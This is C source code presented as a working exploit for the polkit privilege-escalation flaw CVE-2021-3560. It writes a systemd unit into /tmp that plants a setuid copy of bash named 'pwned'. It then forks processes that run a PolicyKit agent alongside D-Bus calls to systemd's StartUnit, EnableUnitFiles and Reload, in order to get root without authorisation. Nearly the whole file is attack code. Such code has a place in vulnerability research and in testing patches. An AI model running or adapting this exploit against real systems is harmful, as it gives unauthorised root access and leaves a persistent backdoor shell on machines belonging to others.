#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dbus/dbus.h>
#include <unistd.h>
#include <gio/gio.h>
#include <gio/gdbusconnection.h>
#include <dbus/dbus-glib-lowlevel.h>
#include "agent.h"

#define dprintf(format, ...) g_print("[pid:%d] "format, getpid(),  ##__VA_ARGS__)
#define dprintferr(format, ...) g_printerr("[pid:%d] "format, getpid(),  ##__VA_ARGS__)

void *method_call_start_service()
{   

    char *parm_1 = "asdasd.service";
    char *parm_2 = "replace";

    sleep(0.1);
    dprintf("[*] Starting systemd service ...\n");


    GError *dbus_error = NULL;
    GCancellable       *cancellable = NULL;
    GDBusConnection  *connection ;
    connection = g_bus_get_sync (G_BUS_TYPE_SYSTEM, cancellable, &dbus_error);

    g_dbus_connection_call_sync ( connection, "org.freedesktop.systemd1" ,
        "/org/freedesktop/systemd1",
        "org.freedesktop.systemd1.Manager",
        "StartUnit",
        g_variant_new("(ss)", parm_1, parm_2 ),
        NULL,
        G_DBUS_CALL_FLAGS_ALLOW_INTERACTIVE_AUTHORIZATION,
        -1,
        NULL,
        NULL
        );

    return 0;    
}

void *method_call_reload_systemd()
{   
    GError *dbus_error = NULL;
    GCancellable       *cancellable = NULL;
    GDBusConnection *connection;

    sleep(0.1);
    dprintf("[*] Reloading systemd daemon ...\n");
    connection = g_bus_get_sync (G_BUS_TYPE_SYSTEM, cancellable, &dbus_error);

    g_dbus_connection_call_sync(connection, "org.freedesktop.systemd1", 
        "/org/freedesktop/systemd1", 
        "org.freedesktop.systemd1.Manager", 
        "Reload", 
        NULL,
        NULL,
        G_DBUS_CALL_FLAGS_ALLOW_INTERACTIVE_AUTHORIZATION,
        -1,
        NULL,
        NULL
        );

    return 0;
}

void *method_call_install_service(){
    GError *dbus_error = NULL;
    GCancellable       *cancellable = NULL;
    GDBusConnection *connection;

    char *param_1[] = {"/tmp/asdasd.service", NULL};    

    sleep(0.1);
    dprintf("[*] Starting install service ...\n");
    connection = g_bus_get_sync (G_BUS_TYPE_SYSTEM, cancellable, &dbus_error);

    g_dbus_connection_call_sync(connection, "org.freedesktop.systemd1", 
        "/org/freedesktop/systemd1", 
        "org.freedesktop.systemd1.Manager", 
        "EnableUnitFiles", 
        g_variant_new ("(^asbb)", param_1, 1, 1),
        NULL,
        G_DBUS_CALL_FLAGS_ALLOW_INTERACTIVE_AUTHORIZATION,
        -1,
        NULL,
        NULL
        );

    return 0;
}

void *start_agent(){
    dprintf("[*] Starting PolicyKit agent ...\n");
    PolkitAuthenticationAgent();
    return 0;
}

int main()
{


    dprintf("[ polkit CVE-2021-3560 exploit ] - RicterZ @ 360 Noah Lab , C writed by Swing @ chaitin\n");
    
    FILE *fp = fopen("/tmp/asdasd.service", "w");
    if (fp){
        fprintf(fp, "[Unit]\nAllowIsolate=no\n\n[Service]\nExecStart=/bin/bash -c 'cp /bin/bash /usr/local/bin/pwned; chmod +s /usr/local/bin/pwned'");
        fclose(fp);
    }

    pthread_t t1 , t2;
    int pid_1 = fork();
    int pid_2 = fork();

    
    if (pid_1 == 0 && pid_2) {
        
        pthread_create(&t1, NULL, &start_agent, NULL); 
        sleep(1);
        pthread_create(&t2, NULL, &method_call_start_service, NULL); 
    } else if (pid_2 == 0 && pid_1) {
        pthread_create(&t1, NULL, &start_agent, NULL);
        sleep(1);
        pthread_create(&t2, NULL, &method_call_install_service, NULL); 
    } else if (pid_1 && pid_2) {
        pthread_create(&t1, NULL, &start_agent, NULL);
        sleep(1);
        pthread_create(&t2, NULL, &method_call_reload_systemd, NULL); 
    }

    sleep(3);
    return 0;
}




